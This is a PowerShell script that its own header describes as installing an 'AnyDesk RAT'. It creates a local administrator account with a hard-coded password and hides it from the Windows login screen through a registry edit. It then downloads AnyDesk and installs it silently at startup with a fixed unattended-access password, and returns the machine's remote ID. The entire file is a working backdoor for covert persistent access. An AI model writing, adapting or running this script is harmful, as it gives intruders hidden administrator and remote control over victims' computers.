<#
.SYNOPSIS
    This Script will Install AnyDesk RAT
.DESCRIPTION
    This Script will Install AnyDesk Rat
    to Local Computer and Adjust It
.NOTES
    File name: NIT-New-AnyDeskInstall.ps1
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2024-09-04
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2024-09-04) Script created
    1.0.1 - 
#>
# param([switch]$Elevated)

#### Set Varianles
$AnyDeskPass = "0a9s8d7F"
$aUSER = "MSSQLSR"
$aPASS = "Admin01234"
$Uri = "http://download.anydesk.com/AnyDesk.exe"
$aNITPath = "C:\ProgramData\NIT"

### Add Global Variables

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

# Set Functions

function NIT-New-AnyDeskInstall {

    #### Derivative Variables
    $anAnyDeskPath = Join-Path -Path $aNITPath -ChildPath "AnyDesk"
    $anAnyDeskFile = Join-Path -Path $aNITPath -ChildPath "AnyDesk.exe"

    ### Exit if Run None-Elevated Mode

    if( (Test-Admin) -eq $false ) {
        $aRes = "Error at Script $PSCommandPath. Script is Run without Elevated Privileges."
        return $aRes
    }
    
    ### Delete AnyDesk if Exist ###

    if( (Test-Path -Path $anAnyDeskFile) -eq $true ) {
        Remove-Item -Path $anAnyDeskFile -Force
    }

    ### Check if a Directory not Exist and Create It

    if( (Test-Path -Path $anAnyDeskPath) -eq $false ) {
        mkdir -p $anAnyDeskPath
    }

    ### Create an Admin User ###
    #
    net user $aUSER $aPASS /add
    net localgroup Administrators $aUSER /ADD
    net localgroup Администраторы $aUSER /ADD
    reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v $aUSER /t REG_DWORD /d 0 /f
    
    ### Download File from Internet ###
    #
    $clnt = new-object System.Net.WebClient
    $clnt.DownloadFile($Uri, $anAnyDeskFile)
    & $env:COMSPEC /c $anAnyDeskFile --install
    & $anAnyDeskFile --start-with-win --silent
    & $env:COMSPEC /c echo $AnyDeskPass | C:\ProgramData\NIT\AnyDesk.exe --set-password

    $aRes = $(& $env:COMSPEC /c $anAnyDeskFile --get-id)

    return $aRes

}

# Run Payloads
NIT-New-AnyDeskInstall